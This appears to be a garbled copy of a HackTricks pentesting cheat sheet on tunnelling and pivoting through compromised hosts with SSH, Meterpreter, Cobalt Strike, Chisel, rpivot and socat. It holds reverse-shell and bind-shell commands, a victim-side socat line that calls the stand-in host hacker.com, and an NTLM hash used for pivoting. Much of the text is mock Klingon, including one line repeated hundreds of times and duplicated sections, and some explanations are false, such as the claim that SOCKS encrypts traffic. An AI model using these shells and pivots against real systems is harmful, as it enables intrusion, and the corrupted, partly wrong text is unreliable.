# qun

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>laH</strong></a><strong>!</strong></summary>

* **Do you work in a cybersecurity company**? **Do you want to see your company advertised in HackTricks**? **or do you want to have access to the latest version of the PEASS or download HackTricks in PDF**? **Check the SUBSCRIPTION PLANS**!
* **Discover The PEASS Family**, **our collection of exclusive NFTs**
* **Get the official PEASS & HackTricks swag**
* **Join the** **💬** [**Discord group**](https://discord.gg/hRep4RUj7f) **or the telegram group** or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the hacktricks repo and hacktricks-cloud repo**.

</details>

## Nmap tip

{% hint style="warning" %}
**ICMP** and **SYN** scans cannot be tunnelled through socks proxies, so we must **disable ping discovery** (`-Pn`) and specify **TCP scans** (`-sT`) for this to work.
{% endhint %}

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH graphical connection (X)

## **SSH**

SSH graphical connection (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

**Qa'vIn SSH Server** --> **'ej** **'oH** **port** **moH** **ghItlh**
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Local port --> Compromised host (SSH) --> Third\_box:Port

### Port2Port

Local port --> Compromised host (SSH) --> Third\_box:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Local Port --> Compromised host (SSH) --> Wherever

### Port2hostnet (proxychains)

Local Port --> Compromised host (SSH) --> Wherever
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Qa'legh Port Forwarding

vaj vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh v
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

**root vItlhutlh** (vaj vay' Dajatlh'a') **ghaH** (vaj vay' Dajatlh'a') **'ej sshd config** **root login** **jatlh**:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ifconfig tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ifconfig tun0 up #Activate the server side network interface
```
### Enable forwarding on the Server side

To enable forwarding on the Server side, you need to modify the SSH server configuration file.

1. Open the SSH server configuration file using a text editor. The file is usually located at `/etc/ssh/sshd_config`.

2. Look for the line that starts with `#PortForwarding` or `AllowTcpForwarding`. Uncomment the line by removing the `#` at the beginning, if present.

3. Set the value of `AllowTcpForwarding` to `yes` to enable TCP forwarding.

4. Save the changes and exit the text editor.

5. Restart the SSH server for the changes to take effect. The command to restart the SSH server may vary depending on your operating system. For example, on Ubuntu, you can use the command `sudo service ssh restart`.

Once forwarding is enabled on the Server side, you can proceed with setting up the tunnel or port forwarding as needed.
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
### Set a new route on the client side

#### English Translation:

### Qapla'! (Success) 
### Set a new route on the client side

#### Klingon Translation:

### Qapla'! (Success) 
### Set a new route on the client side
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
## SSHUTTLE

**SSHUTTLE** jImej **tunnel** **ssh** Daq **traffic** **subnetwork** Hoch through a host.\
ghaH, 10.10.10.0/24 laH traffic **forward**.
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
**Connect with a private key**

To connect to a remote server using a private key, follow these steps:

1. Generate a private/public key pair on your local machine if you don't already have one. You can use tools like `ssh-keygen` to generate the keys.

2. Copy the public key (`id_rsa.pub`) to the remote server. You can use the `ssh-copy-id` command to automatically copy the key to the remote server.

3. Set the correct permissions for the private key file (`id_rsa`). The file should only be readable by the owner. You can use the `chmod` command to set the permissions.

4. Connect to the remote server using the private key. Use the `ssh` command with the `-i` option to specify the private key file.

Example:

```bash
ssh -i /path/to/private_key user@remote_server
```

Make sure to replace `/path/to/private_key` with the actual path to your private key file, `user` with the remote server username, and `remote_server` with the IP address or hostname of the remote server.

By connecting with a private key, you can securely authenticate to the remote server without the need for a password. This method is commonly used in secure shell (SSH) connections for enhanced security.
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Local port --> Compromised host (active session) --> Third\_box:Port

## Meterpreter

### Port2Port

Local port --> Compromised host (active session) --> Third\_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
#### Introduction

SOCKS is a protocol that allows for the creation of a secure and encrypted tunnel between a client and a server. This tunnel can be used to forward network traffic, bypass firewalls, and access restricted resources.

#### How SOCKS Works

When a client wants to establish a connection to a server through a SOCKS proxy, it sends a request to the proxy server. The proxy server then establishes a connection with the destination server on behalf of the client. Once the connection is established, the proxy server relays the data between the client and the server.

#### Advantages of Using SOCKS

- **Flexibility**: SOCKS can be used with any protocol, making it versatile for various applications.
- **Firewall Bypass**: SOCKS allows users to bypass firewalls and access restricted resources by tunneling their traffic through the proxy server.
- **Encryption**: SOCKS supports encryption, ensuring that data transmitted through the tunnel remains secure and private.
- **Anonymity**: By routing traffic through a proxy server, SOCKS can help users maintain their anonymity online.

#### Setting Up a SOCKS Proxy

To set up a SOCKS proxy, you need a SOCKS server and a client that supports SOCKS. The client will connect to the SOCKS server and configure its network settings to use the proxy.

1. Install and configure a SOCKS server on a remote machine.
2. Install a SOCKS client on your local machine.
3. Configure the SOCKS client to connect to the SOCKS server.
4. Update your network settings to use the SOCKS proxy.

#### Examples of SOCKS Usage

- **Bypassing Firewalls**: Use a SOCKS proxy to bypass firewall restrictions and access blocked websites or services.
- **Secure Remote Access**: Set up a SOCKS proxy to securely access resources on a remote network.
- **Anonymity**: Use a SOCKS proxy to hide your IP address and maintain anonymity while browsing the internet.

#### Conclusion

SOCKS is a versatile protocol that enables secure tunneling and port forwarding. By using a SOCKS proxy, users can bypass firewalls, access restricted resources, and maintain their anonymity online.
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
**Another way:**

**Klingon Translation:**

**QaStaHvIS:**
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

**beacon**-Daq yIqImta' **traffic route**-mo' **ghItlh**-e' **traffic**-Daq **route**-mo' **interfaces**-Daq **listening**-Daq **teamserver**-Daq **port**-e' **open**-mo'.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

{% hint style="warning" %}
vaj rur, **port vItlhutlh be'pu'**, 'ej vaj traffic vItlhutlh Team Server 'ej vaj host:port qar'a' vItlhutlh
{% endhint %}
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
To note:

- Beacon's reverse port forward is designed to **tunnel traffic to the Team Server, not for relaying between individual machines**.
- Traffic is **tunneled within Beacon's C2 traffic**, including P2P links.
- **Admin privileges are not required** to create reverse port forwards on high ports.

### rPort2Port local

{% hint style="warning" %}
In this case, the **port is opened in the beacon host**, not in the Team Server and the **traffic is sent to the Cobalt Strike client** (not to the Team Server) and from there to the indicated host:port
{% endhint %}
```
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

tlhIngan Hol:
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

tlhIngan Hol:
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

ghItlhvam vItlhutlh [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) releases pe'\
**client teb server laH** vItlhutlh.
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port forwarding

#### What is Port Forwarding?

Port forwarding is a technique used to redirect network traffic from one port on a network device to another port on a different device. It allows external devices to access services running on internal devices that are behind a firewall or NAT (Network Address Translation) device.

#### How Does Port Forwarding Work?

Port forwarding works by creating a mapping between a specific port on the external IP address of a network device and a specific port on an internal device. When a request is made to the external IP address and port, the network device forwards the traffic to the internal device.

#### Why Use Port Forwarding?

Port forwarding is commonly used in scenarios where there is a need to access services running on internal devices from external networks. For example, if you have a web server running on a device behind a firewall, you can use port forwarding to allow external users to access the web server.

#### Types of Port Forwarding

There are two main types of port forwarding:

1. Local Port Forwarding: This type of port forwarding allows you to forward traffic from a local port on your machine to a remote port on another machine. It is useful when you want to access services running on a remote machine through a secure tunnel.

2. Remote Port Forwarding: This type of port forwarding allows you to forward traffic from a remote port on a remote machine to a local port on your machine. It is useful when you want to expose services running on your machine to the outside world.

#### Port Forwarding Tools

There are several tools available for port forwarding, including:

- SSH (Secure Shell): SSH can be used for both local and remote port forwarding. It provides a secure way to create tunnels and forward traffic.

- ngrok: ngrok is a cloud-based service that allows you to expose local servers behind NATs and firewalls to the public internet.

- socat: socat is a command-line utility that can be used to create bidirectional data streams between two endpoints.

#### Conclusion

Port forwarding is a powerful technique that allows you to redirect network traffic and access services running on internal devices from external networks. It is an essential tool for network administrators and can be used in various scenarios to enhance connectivity and security.
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Reverse tunnel. The tunnel is started from the victim.\
A socks4 proxy is created on 127.0.0.1:1080

---

## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Reverse tunnel. The tunnel is started from the victim.\
A socks4 proxy is created on 127.0.0.1:1080
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
**NTLM proxy**-Daq **pivot**:

Pivot through **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### **Bind shell**

**Socat** is a powerful networking tool that allows you to create various types of network connections. One of its useful features is the ability to create a bind shell.

A bind shell is a type of shell that listens for incoming connections on a specific port. Once a connection is established, the bind shell provides a command prompt that allows the attacker to execute commands on the target system.

To create a bind shell using Socat, you can use the following command:

```bash
socat TCP-LISTEN:<port> EXEC:<command>
```

Replace `<port>` with the desired port number and `<command>` with the command you want to execute on the target system.

For example, to create a bind shell on port 4444 and execute the `/bin/bash` command, you can use the following command:

```bash
socat TCP-LISTEN:4444 EXEC:/bin/bash
```

Once the bind shell is created, you can connect to it using a tool like Netcat or Telnet.
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
#### Reverse shell

A reverse shell is a technique used in hacking to establish a connection between the attacker's machine and the target machine. This allows the attacker to gain remote access to the target machine and execute commands on it.

To create a reverse shell, the attacker needs to set up a listener on their machine and then exploit a vulnerability on the target machine to establish a connection back to the attacker. Once the connection is established, the attacker can interact with the target machine's command prompt and execute commands as if they were physically present on the machine.

Reverse shells are commonly used in post-exploitation scenarios to maintain persistent access to a compromised system. They can also be used to bypass firewalls and network restrictions by establishing a connection from the inside of a network to the outside.

There are various tools and techniques available for creating reverse shells, including using netcat, meterpreter, or custom scripts. The choice of tool depends on the specific requirements of the attack and the capabilities of the target machine.

It is important to note that using reverse shells for unauthorized access to systems is illegal and unethical. Reverse shells should only be used for legitimate purposes, such as penetration testing or authorized system administration tasks.
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
#### Port2Port

Port2Port is a technique used in network security to establish a connection between two different ports on a network. It allows traffic to be forwarded from one port to another, enabling communication between two devices that may not have direct access to each other.

Port2Port can be used for various purposes, such as bypassing firewalls or accessing services on a remote network. It is commonly employed in penetration testing and network troubleshooting scenarios.

To set up a Port2Port connection, a tunneling protocol is typically used. This protocol encapsulates the original network traffic and redirects it to the desired port on the target device. Some commonly used tunneling protocols include SSH tunneling, VPN tunneling, and reverse SSH tunneling.

Port2Port can be a powerful tool in the hands of a skilled hacker, as it allows them to bypass network restrictions and gain access to sensitive information or services. However, it is important to note that the use of Port2Port for malicious purposes is illegal and unethical.

In conclusion, Port2Port is a technique that enables the forwarding of network traffic between two different ports. It can be used for legitimate purposes such as network troubleshooting, but it can also be exploited by hackers for unauthorized access.
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port through socks

#### Introduction

Port forwarding is a technique used to redirect network traffic from one port on a host to another port on a different host. This can be useful in various scenarios, such as accessing a service running on a remote machine or bypassing network restrictions.

One common method of port forwarding is through the use of a SOCKS proxy. SOCKS (Socket Secure) is a protocol that allows for the exchange of network packets between a client and a server through a proxy server. By configuring a SOCKS proxy, it is possible to establish a tunnel between two hosts and forward traffic between specific ports.

#### Setting up a SOCKS proxy

To set up a SOCKS proxy, you will need a server that supports the SOCKS protocol. There are various options available, such as SSH servers or dedicated SOCKS proxy servers.

Once you have access to a SOCKS proxy server, you can configure your client to use it. This can typically be done through the network settings of your operating system or application.

#### Forwarding traffic using a SOCKS proxy

Once the SOCKS proxy is set up, you can use it to forward traffic between ports on different hosts. This can be done using tools such as `socat` or `nc` (netcat).

To forward traffic from a local port to a remote port through the SOCKS proxy, you can use the following command:

```bash
socat TCP-LISTEN:<local_port>,bind=<local_ip> SOCKS4A:<proxy_ip>:<remote_host>:<remote_port>,socksport=<proxy_port>
```

Replace `<local_port>` with the desired local port, `<local_ip>` with the local IP address, `<proxy_ip>` with the IP address of the SOCKS proxy server, `<remote_host>` with the remote host IP address or hostname, and `<remote_port>` with the remote port.

#### Conclusion

Port forwarding through a SOCKS proxy can be a powerful technique for accessing services on remote hosts or bypassing network restrictions. By setting up a SOCKS proxy and forwarding traffic between ports, it is possible to establish a tunnel and redirect network traffic as needed.
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter through SSL Socat

#### Introduction

In this technique, we will use SSL Socat to establish a secure connection and tunnel Meterpreter traffic. Socat is a command-line utility that allows us to create bidirectional data streams between two endpoints. By using SSL Socat, we can encrypt the traffic between our attacking machine and the target machine, making it more difficult for network monitoring tools to detect our activities.

#### Prerequisites

Before we begin, make sure you have the following:

- A Linux machine with Socat installed
- A Meterpreter payload generated using msfvenom

#### Step 1: Set up the listener

First, we need to set up a listener on our attacking machine to receive the Meterpreter session. Open a terminal and run the following command:

```plaintext
socat openssl-listen:443,reuseaddr,fork,cert=server.pem,verify=0 -
```

This command sets up a listener on port 443 using SSL Socat. The `cert=server.pem` option specifies the SSL certificate file to use, and `verify=0` disables certificate verification.

#### Step 2: Forward the traffic

Next, we need to forward the traffic from the target machine to our attacking machine. On the target machine, run the following command:

```plaintext
socat openssl-connect:attacker-ip:443,verify=0 -
```

Replace `attacker-ip` with the IP address of your attacking machine. This command establishes a connection to our attacking machine using SSL Socat.

#### Step 3: Start the Meterpreter session

Finally, we can start the Meterpreter session. On the target machine, run the following command:

```plaintext
msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set lhost attacker-ip;set lport 443;exploit"
```

Replace `attacker-ip` with the IP address of your attacking machine. This command starts the Meterpreter handler and sets the payload to `windows/meterpreter/reverse_tcp`, which is compatible with our SSL Socat setup.

#### Conclusion

By using SSL Socat, we can establish a secure connection and tunnel Meterpreter traffic, making it more difficult for network monitoring tools to detect our activities. This technique can be useful in scenarios where traditional Meterpreter sessions may be blocked or monitored.
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
**Klingon Translation:**

